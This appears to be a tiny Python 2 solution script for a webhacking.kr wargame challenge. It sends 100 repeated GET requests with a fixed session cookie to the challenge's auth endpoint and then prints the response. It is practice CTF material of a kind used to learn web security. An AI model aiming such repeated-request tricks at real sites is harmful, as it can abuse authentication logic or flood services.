import requests

url='http://webhacking.kr/challenge/web/web-37?mode=auth'
cookies={'PHPSESSID':'aaaaaaaaaaaaaaaaaaaaaaaaaa'}

for i in xrange(100):
    requests.get(url, cookies=cookies).text

print  requests.get(url, cookies=cookies).text
